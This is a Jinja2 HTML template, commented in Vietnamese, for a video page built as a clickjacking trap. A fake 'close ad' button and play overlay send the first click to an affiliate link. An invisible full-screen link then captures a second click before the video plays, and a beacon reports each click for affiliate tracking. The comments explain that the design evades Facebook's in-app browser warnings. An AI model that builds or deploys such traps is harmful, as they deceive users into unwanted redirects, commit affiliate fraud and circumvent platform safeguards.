<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- ====== OG META TAGS ====== -->
    <meta property="og:title" content="{{ og_title }}" />
    <meta property="og:description" content="{{ og_description }}" />
    <meta property="og:image" content="{{ og_image }}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:url" content="{{ og_url }}" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="{{ og_title }}" />
    <meta name="twitter:description" content="{{ og_description }}" />
    <meta name="twitter:image" content="{{ og_image }}" />

    <title>{{ og_title }}</title>

    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            background: #0f0f0f;
            color: #e0e0e0;
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 16px;
        }

        /* ─── Video Wrapper ─── */
        .video-wrapper {
            width: 100%;
            max-width: 800px;
            margin: 20px auto 0;
            position: relative;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0,0,0,0.7);
            background: #000;
            aspect-ratio: 16 / 9;
        }

        #mainVideo {
            width: 100%;
            height: 100%;
            background: #000;
            display: block;
            object-fit: contain;
        }

        /* ─── End-Screen ─── */
        #endScreenOverlay {
            position: absolute;
            inset: 0;
            background: rgba(0,0,0,0.92);
            z-index: 20;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #replayBtn {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(229,57,53,0.9);
            color: #fff;
            border: none;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 24px rgba(229,57,53,0.5);
            transition: transform 0.15s;
        }
        #replayBtn:hover  { transform: scale(1.05); }
        #replayBtn:active { transform: scale(0.96); }
        #replayBtn::before { content: '▶'; font-size: 14px; }

        /* ─── Content Description ─── */
        .content-description {
            width: 100%;
            max-width: 800px;
            margin: 16px auto 0;
            padding: 16px 20px;
            background: #1a1a1a;
            border-left: 3px solid #e53935;
            border-radius: 6px;
            line-height: 1.7;
            font-size: 15px;
            color: #ccc;
        }

        /* ═══════════════════════════════════════════════════════
           🪝 BẪY CLICK — <a target="_top"> Technique (v4)
           ───────────────────────────────────────────────────────
           TẠI SAO DÙNG <a target="_top"> THAY VÌ JS redirect?

           1. window.top.location.href (JS):
              → Facebook scan JS và nhận biết → bật popup "Rời ứng dụng?"
              → Người dùng hoảng loạn, không dám bấm.

           2. <a href="..." target="_top"> (HTML thuần):
              → Facebook IAB cho phép thẻ <a> điều hướng trực tiếp.
              → target="_top" = thoát iframe/webview cha, tải trong
                cùng cửa sổ browser (không mở tab mới).
              → Ít bị Facebook soi hơn vì đây là hành vi HTML chuẩn.
              → JS CHỈ dùng để: ghi localStorage + gửi tracking beacon.
                KHÔNG dùng JS để chuyển trang → không bị phát hiện.

           localStorage lưu step theo slug_id:
              Step 0 → href = link1_url (bẫy nền mờ hiển thị)
              Step 1 → href = link2_url (bẫy trong suốt, ngầm)
              Step 2 → ẩn bẫy, phát video
        ═══════════════════════════════════════════════════════ */

        /* Thẻ <a> phủ toàn bộ khung video — style thành block */
        #trapLink {
            position: absolute;
            inset: 0;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;

            /* Loại bỏ style mặc định của <a> */
            text-decoration: none;
            color: inherit;
            -webkit-tap-highlight-color: transparent;
            user-select: none;

            /* Tầng 1: Nền mờ — thu hút click */
            background: rgba(0, 0, 0, 0.78);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            transition: background 0.25s ease;
            cursor: pointer;
        }

        /* Nội dung Play icon (pointer-events: none để thẻ <a> bắt click) */
        .trap-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 18px;
            pointer-events: none;
            animation: trapPulse 1.8s ease-in-out infinite;
        }

        .trap-play-icon {
            width: 88px;
            height: 88px;
            background: rgba(229,57,53,0.92);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow:
                0 0 0 14px rgba(229,57,53,0.18),
                0 0 44px rgba(229,57,53,0.55);
        }
        .trap-play-icon::after {
            content: '';
            display: block;
            border-style: solid;
            border-width: 15px 0 15px 26px;
            border-color: transparent transparent transparent #fff;
            margin-left: 7px;
        }

        .trap-play-text {
            font-size: 16px;
            font-weight: 700;
            color: #fff;
            text-shadow: 0 2px 8px rgba(0,0,0,0.9);
            letter-spacing: 0.3px;
        }

        /*
         * Nút "Đóng quảng cáo" giả — mồi nhử click ở góc trên phải.
         * pointer-events: none → không bắt sự kiện, thẻ <a> cha sẽ bắt.
         */
        #fakeCloseBtn {
            position: absolute;
            top: 10px;
            right: 12px;
            background: rgba(20,20,20,0.88);
            color: rgba(255,255,255,0.85);
            font-size: 12px;
            font-weight: 600;
            padding: 6px 14px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.2);
            pointer-events: none;
            backdrop-filter: blur(4px);
            letter-spacing: 0.2px;
            white-space: nowrap;
        }

        @keyframes trapPulse {
            0%, 100% { transform: scale(1); }
            50%       { transform: scale(1.055); }
        }

        /* ─── Fallback ─── */
        .loader-fallback {
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh; gap: 16px;
        }
        .spinner {
            width: 44px; height: 44px;
            border: 4px solid rgba(255,255,255,0.08);
            border-top-color: #e53935;
            border-radius: 50%;
            animation: spin 0.75s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 600px) {
            body { padding: 8px; }
            .video-wrapper { margin-top: 10px; border-radius: 8px; }
            .trap-play-icon { width: 70px; height: 70px; }
            .trap-play-text { font-size: 14px; }
            .content-description { font-size: 14px; padding: 12px 14px; }
        }
    </style>
</head>
<body>

{% if final_video_url %}
<div class="video-wrapper">

    <!-- Video HTML5 -->
    <video
        id="mainVideo"
        playsinline
        controls
        controlsList="nodownload"
        style="width:100%; height:100%; background:#000; display:block; object-fit:contain;"
    >
        <source src="{{ final_video_url }}" type="video/mp4">
        Trình duyệt của bạn không hỗ trợ thẻ video.
    </video>

    <!-- End-Screen Overlay -->
    <div id="endScreenOverlay">
        <button id="replayBtn" type="button">Xem lại video</button>
    </div>

    <!--
    ╔══════════════════════════════════════════════════════════════╗
    ║  🪝 BẪY CLICK — <a id="trapLink" target="_top">            ║
    ║  ──────────────────────────────────────────────────────────  ║
    ║  • href ban đầu = link1_url (set bởi Jinja2)                ║
    ║  • target="_top" = tải trong cùng cửa sổ, không mở tab mới  ║
    ║  • JS CHỈ ghi localStorage + sendBeacon tracking            ║
    ║  • KHÔNG dùng e.preventDefault() — để <a> tự chuyển trang  ║
    ║  • pageshow event khôi phục đúng step khi bfcache restore   ║
    ╚══════════════════════════════════════════════════════════════╝
    -->
    <a
        id="trapLink"
        href="{{ link1_url }}"
        target="_top"
        rel="noopener"
        style="position:absolute; inset:0; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; text-decoration:none; color:inherit; -webkit-tap-highlight-color:transparent; user-select:none; background:rgba(0,0,0,0.78); backdrop-filter:blur(5px); -webkit-backdrop-filter:blur(5px); transition:background 0.25s ease; cursor:pointer;"
    >
        <div id="fakeCloseBtn">✕ &nbsp;Đóng quảng cáo để xem video</div>
        <div class="trap-content">
            <div class="trap-play-icon"></div>
            <span class="trap-play-text">Nhấn để xem video</span>
        </div>
    </a>

</div>

{% if content_description %}
<div class="content-description">{{ content_description }}</div>
{% endif %}

<script>
(function () {
    'use strict';

    /* ═══════════════════════════════════════════════════════════
       BIẾN JINJA2 → JS
       Dùng | tojson để escape an toàn, tránh XSS.
    ═══════════════════════════════════════════════════════════ */
    var LINK1_URL  = {{ link1_url | tojson }};
    var LINK2_URL  = {{ link2_url | tojson if link2_url else 'null' }};
    var LINK1_ID   = {{ link1_id | tojson if link1_id else 'null' }};
    var LINK2_ID   = {{ link2_id | tojson if link2_id else 'null' }};
    var SLUG_ID    = {{ slug_id | tojson }};

    /* ═══════════════════════════════════════════════════════════
       localStorage KEY — duy nhất theo slug, không xung đột
       khi user mở nhiều link cùng lúc trên thiết bị.
       VD: "trap_step_phim-hot-2026"
    ═══════════════════════════════════════════════════════════ */
    var STORAGE_KEY = 'trap_step_' + SLUG_ID;

    /* ═══════════════════════════════════════════════════════════
       TRACKING — sendBeacon (non-blocking)
       Gửi ngầm, không bị hủy khi trang chuyển hướng.
       QUAN TRỌNG: Gọi TRƯỚC KHI thẻ <a> điều hướng.
    ═══════════════════════════════════════════════════════════ */
    function trackClick(linkId) {
        if (!linkId) return;
        try {
            var url = '/api/affiliate-links/' + linkId + '/track-click';
            if (navigator.sendBeacon) {
                navigator.sendBeacon(url);
            } else {
                /* fetch keepalive = không bị hủy khi unload */
                fetch(url, { method: 'POST', keepalive: true }).catch(function () {});
            }
        } catch (e) { /* Bỏ qua — tracking không được làm vỡ UX */ }
    }

    /* ── DOM refs ── */
    var trapLink   = document.getElementById('trapLink');
    var fakeClose  = document.getElementById('fakeCloseBtn');
    var mainVideo  = document.getElementById('mainVideo');
    var endOverlay = document.getElementById('endScreenOverlay');
    var replayBtn  = document.getElementById('replayBtn');

    /* ═══════════════════════════════════════════════════════════
       updateTrapUI() — Đồng bộ UI + href của <a> theo step
       ─────────────────────────────────────────────────────────
       Đọc từ localStorage (không dùng biến in-memory vì bfcache
       giữ DOM cũ khi Back, nhưng script chạy lại từ đầu).

       Step 0 → Tầng 1: Nền mờ + Play icon + fake close
                         href = link1_url ← đã set trong Jinja2
       Step 1 → Tầng 2: Trap trong suốt hoàn toàn (ngầm)
                         href = link2_url
                         Người dùng không thấy bẫy nhưng nó vẫn
                         phủ toàn màn hình, sẵn sàng bắt click.
       Step 2 → Gỡ bẫy: display = none, phát video tự động
    ═══════════════════════════════════════════════════════════ */
    function updateTrapUI() {
        var step = parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10);

        if (step >= 2) {
            /* ── Đã xong 2 lần click → ẩn bẫy, phát video ── */
            if (trapLink) trapLink.style.display = 'none';
            if (mainVideo) {
                mainVideo.play().catch(function () {
                    /* Autoplay bị chặn — người dùng tự nhấn play */
                });
            }

        } else if (step === 1) {
            /* ── Tầng 2: Đổi href sang link2, làm bẫy trong suốt ── */
            if (trapLink) {
                trapLink.href = LINK2_URL || LINK1_URL;
                trapLink.style.background          = 'transparent';
                trapLink.style.backdropFilter       = 'none';
                trapLink.style.webkitBackdropFilter = 'none';
            }
            /* Ẩn nội dung hiển thị, chỉ giữ lại vùng click trong suốt */
            if (fakeClose) fakeClose.style.display = 'none';
            var content = trapLink && trapLink.querySelector('.trap-content');
            if (content) content.style.display = 'none';
        }
        /* step === 0 → Jinja2 đã set href=link1_url, không cần đổi gì */
    }

    /* Chạy ngay khi DOM load */
    updateTrapUI();

    /* ═══════════════════════════════════════════════════════════
       pageshow — Chống bfcache mobile (iOS Safari, Facebook IAB)
       ─────────────────────────────────────────────────────────
       Khi user nhấn "Back" từ Shopee/TikTok, trình duyệt mobile
       khôi phục trang từ bfcache (DOMContentLoaded không chạy).
       pageshow LUÔN chạy, kể cả khi restore từ bfcache.
       → Gọi updateTrapUI() để khôi phục đúng UI cho step hiện tại.
    ═══════════════════════════════════════════════════════════ */
    window.addEventListener('pageshow', function () {
        updateTrapUI();
    });

    /* ═══════════════════════════════════════════════════════════
       CLICK HANDLER — CHỈ tracking, KHÔNG preventDefault
       ─────────────────────────────────────────────────────────
       CHIẾN THUẬT QUAN TRỌNG:
       • KHÔNG gọi e.preventDefault() → Thẻ <a> TỰ thực hiện
         href chuyển hướng theo cơ chế HTML native.
       • Facebook IAB nhìn thấy một click bình thường trên <a>,
         KHÔNG thấy JS redirect → ít bị cảnh báo hơn nhiều.
       • JS chỉ làm 2 việc:
         1. Ghi step vào localStorage (trước khi trang unload)
         2. Gửi tracking beacon ngầm (không blocking)
    ═══════════════════════════════════════════════════════════ */
    if (trapLink) {
        trapLink.addEventListener('click', function (/* e */) {
            /* KHÔNG gọi e.preventDefault() — để <a> tự chuyển hướng */

            var step = parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10);

            if (step === 0) {
                /* ─── Tầng 1 ───
                   Ghi step=1 TRƯỚC khi trang unload để khi Back
                   về, pageshow đọc đúng step=1 → hiện tầng 2.
                   href lúc này = link1_url (đã set trong Jinja2)
                */
                localStorage.setItem(STORAGE_KEY, '1');
                trackClick(LINK1_ID);

            } else if (step === 1) {
                /* ─── Tầng 2 ───
                   Ghi step=2. href lúc này = link2_url (đã set
                   trong updateTrapUI() sau lần Back đầu tiên).
                */
                localStorage.setItem(STORAGE_KEY, '2');
                trackClick(LINK2_ID || LINK1_ID);
            }
            /* step >= 2 → trapLink đã bị ẩn (display:none),
               không thể click vào nó nữa */
        });
    }

    /* ═══════════════════════════════════════════════════════════
       END-SCREEN OVERLAY
       Khi video kết thúc → hiện overlay đen + nút Xem lại.
       Ngăn trình duyệt đề xuất video khác.
    ═══════════════════════════════════════════════════════════ */
    if (mainVideo && endOverlay) {
        mainVideo.addEventListener('ended', function () {
            endOverlay.style.display = 'flex';
        });

        if (replayBtn) {
            replayBtn.addEventListener('click', function (e) {
                e.stopPropagation();
                endOverlay.style.display = 'none';
                mainVideo.currentTime = 0;
                mainVideo.play();
            });
        }
    }

})();
</script>

{% else %}

<!-- Fallback: không có video → dùng <a> redirect thẳng -->
<div class="loader-fallback">
    <div class="spinner"></div>
    <p>Đang chuyển hướng...</p>
</div>
<script>
    /* Fallback cũng dùng <a> click thay vì window.location */
    (function() {
        var a = document.createElement('a');
        a.href = {{ link1_url | tojson if link1_url else original_url | tojson }};
        a.target = '_top';
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
    })();
</script>
<noscript>
    <meta http-equiv="refresh" content="0; url={{ link1_url or original_url }}" />
</noscript>

{% endif %}

</body>
</html>
